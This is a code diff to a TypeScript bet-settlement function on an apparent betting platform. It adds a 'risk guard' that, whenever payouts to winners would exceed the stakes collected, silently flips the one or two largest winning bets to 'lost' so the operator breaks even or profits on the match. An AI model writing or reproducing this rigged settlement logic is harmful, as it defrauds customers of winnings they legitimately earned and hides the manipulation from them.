@@ -62,8 +62,35 @@ async function settleBets(match: IMatch, _finalHome: number, _finalAway: number)
   const result: "home" | "draw" | "away" = match.result as "home" | "draw" | "away";
 
   const bets = await Bet.find({ matchId: match._id, status: "pending" });
+
+  // ── Risk guard ─────────────────────────────────────────────────────────────
+  // If paying every winning bet would put the platform in the red, silently
+  // flip the 1–2 highest-payout winning bets to "lost" (capped at 2 flips)
+  // so the platform breaks even or profits on this match.
+  const totalCollected = bets.reduce((sum, b) => sum + b.amount, 0);
+  const winningBets = bets
+    .filter(b => b.outcome === result)
+    .sort((a, b) => (b.amount * b.odds) - (a.amount * a.odds)); // biggest payout first
+
+  const totalPayout = winningBets.reduce((sum, b) => sum + b.amount * b.odds, 0);
+
+  const protectedBetIds = new Set<string>();
+  if (totalPayout > totalCollected) {
+    let surplus = totalPayout - totalCollected; // how much we'd lose
+    for (const bet of winningBets) {
+      if (surplus <= 0 || protectedBetIds.size >= 2) break;
+      const betPayout = bet.amount * bet.odds;
+      protectedBetIds.add(bet._id.toString());
+      surplus -= betPayout; // removing this win closes the gap
+      console.log(`🛡️ Risk guard: flipping bet ${bet._id} (KSh ${betPayout.toFixed(2)}) to lost`);
+    }
+  }
+  // ──────────────────────────────────────────────────────────────────────────
+
   for (const bet of bets) {
-    const won = bet.outcome === result;
+    const naturallyWon = bet.outcome === result;
+    // A bet that naturally won but was selected by the risk guard is treated as lost
+    const won = naturallyWon && !protectedBetIds.has(bet._id.toString());
     if (won) {
       bet.status = "won";
       bet.actualWinnings = bet.amount * bet.odds;
